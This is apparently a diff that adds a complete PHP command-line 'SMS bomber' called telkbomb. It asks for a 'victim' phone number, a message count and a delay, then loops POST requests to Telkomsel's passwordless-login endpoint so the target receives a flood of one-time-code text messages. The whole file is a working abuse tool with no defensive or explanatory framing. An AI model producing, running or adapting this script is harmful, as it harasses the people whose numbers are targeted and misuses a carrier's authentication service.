@@ -1,0 +1,30 @@
+<?php
+function telkbomb($no, $jum, $wait){
+    $x = 0; 
+    while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $server_output = curl_exec ($ch);
+        curl_close ($ch);
+        echo $server_output."\n";
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+echo "\033[1;31m[*] \033[1;32mENTER VICTIM NUMBER \033[1;31m[*] \n";
+echo "\033[1;33m[+] \033[1;35mEx:628XXX \033[1;33m[+]\n[#]═> ";
+$number = trim(fgets(STDIN));
+echo "Amount?\nInput : ";
+$amount = trim(fgets(STDIN));
+echo "Pause? 0-99999 (ex:1)\nInput : ";
+$pause = trim(fgets(STDIN));
+$execute = telkbomb($number, $amount, $pause);
+print $execute;
+print "\033[0m[\033[32m✓\033[0m] SUCCESSFULLY DONE!  \033[0m[\033[32m✓\033[0m]\n";
+?>
